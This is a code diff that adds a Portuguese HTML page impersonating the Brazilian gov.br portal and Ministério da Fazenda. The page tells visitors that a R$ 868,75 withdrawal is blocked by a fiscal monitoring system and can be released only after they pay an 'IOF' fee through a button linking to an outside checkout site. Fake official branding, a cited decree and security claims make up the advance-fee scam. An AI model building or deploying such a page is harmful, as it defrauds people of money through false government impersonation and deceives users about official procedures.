@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Regularização - GOV</title>
+    <style>
+        /* Estilos Base Estilo GOV */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Rawline", helvetica, arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f1f2;
+            color: #333;
+        }
+
+        /* Barra Superior Oficial */
+        .gov-header {
+            background-color: #fff;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            border-bottom: 2px solid #004085;
+            justify-content: space-between;
+        }
+
+        .gov-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .gov-logo img {
+            height: 25px;
+        }
+
+        .gov-logo span {
+            font-weight: 700;
+            font-size: 18px;
+            color: #004085;
+        }
+
+        /* Container Principal */
+        .main-content {
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+        /* Alerta de Retenção */
+        .alert-box {
+            background-color: #fff;
+            border-radius: 8px;
+            border-left: 6px solid #e52207; /* Vermelho Alerta */
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+
+        .alert-title {
+            color: #e52207;
+            font-weight: 800;
+            font-size: 16px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .alert-text {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #555;
+        }
+
+        /* Detalhes do Saldo Travado */
+        .info-card {
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .info-header {
+            border-bottom: 1px solid #eee;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+        }
+
+        .info-header h2 {
+            font-size: 15px;
+            color: #004085;
+            text-transform: uppercase;
+        }
+
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .label {
+            color: #666;
+        }
+
+        .value {
+            font-weight: 700;
+            color: #333;
+        }
+
+        .value.highlight {
+            color: #008053; /* Verde Sucesso/Dinheiro */
+        }
+
+        .value.tax {
+            color: #e52207;
+        }
+
+        /* Divisor */
+        .divider {
+            height: 1px;
+            background: #eee;
+            margin: 15px 0;
+        }
+
+        /* Seção IOF */
+        .iof-explanation {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 13px;
+            border: 1px solid #ddd;
+            margin-bottom: 20px;
+        }
+
+        .iof-explanation strong {
+            display: block;
+            margin-bottom: 5px;
+            color: #1351b4;
+        }
+
+        /* Botão de Ação */
+        .cta-button {
+            display: block;
+            width: 100%;
+            background-color: #1351b4;
+            color: #fff;
+            text-decoration: none;
+            text-align: center;
+            padding: 18px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 16px;
+            box-shadow: 0 4px 0 #0c326d;
+            transition: all 0.2s;
+        }
+
+        .cta-button:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #0c326d;
+        }
+
+        /* Selos de Segurança */
+        .security-footer {
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .security-footer img {
+            width: 120px;
+            opacity: 0.7;
+        }
+
+        .footer-text {
+            font-size: 11px;
+            color: #999;
+            margin-top: 10px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Oficial -->
+    <div class="gov-header">
+        <div class="gov-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/3840px-Gov.br_logo.svg.png" alt="Gov.br">
+        </div>
+        <div style="font-size: 10px; text-align: right; color: #666;">
+            MINISTÉRIO DA FAZENDA<br>
+            <strong>SISTEMA DE TRANSFERÊNCIAS</strong>
+        </div>
+    </div>
+
+    <div class="main-content">
+        
+        <!-- Bloco de Erro/Retenção -->
+        <div class="alert-box">
+            <div class="alert-title">
+                ⚠️ Transação Bloqueada
+            </div>
+            <div class="alert-text">
+                O seu saque de <strong>R$ 868,75</strong> foi identificado pelo sistema de monitoramento fiscal. De acordo com o Decreto-Lei nº 6.306, transações de plataformas digitais requerem o recolhimento antecipado do <strong>IOF (Imposto sobre Operações Financeiras)</strong>.
+            </div>
+        </div>
+
+        <!-- Detalhamento de Valores -->
+        <div class="info-card">
+            <div class="info-header">
+                <h2>Resumo da Solicitação</h2>
+            </div>
+            
+            <div class="data-row">
+                <span class="label">Beneficiário:</span>
+                <span class="value">Usuário Identificado</span>
+            </div>
+            <div class="data-row">
+                <span class="label">Valor Liberado:</span>
+                <span class="value highlight">R$ 868,75</span>
+            </div>
+            <div class="data-row">
+                <span class="label">Status:</span>
+                <span class="value tax">Aguardando Imposto</span>
+            </div>
+            <div class="data-row">
+                <span class="label">Tributo (IOF 3.8%):</span>
+                <span class="value tax">R$ 33,76</span>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="iof-explanation">
+                <strong>Por que devo pagar agora?</strong>
+                Para que o valor total de R$ 868,75 seja enviado via PIX instantâneo para sua conta, a taxa federal deve ser liquidada. Após a confirmação do pagamento do tributo, o desbloqueio ocorre em <strong>até 3 minutos</strong>.
+            </div>
+
+            <a href="https://www.pagamentos-seguro.link/checkout/a51638a8-6b8a-4727-9be3-0803d327e1a5" class="cta-button">
+                PAGAR IOF E LIBERAR SAQUE
+            </a>
+        </div>
+
+        <!-- Segurança -->
+        <div class="security-footer">
+            <p class="footer-text">
+                Ambiente criptografado e monitorado pela Secretaria do Tesouro Nacional.<br>
+                © 2024 Portal de Serviços do Governo Federal.
+            </p>
+        </div>
+
+    </div>
+
+</body>
+</html>
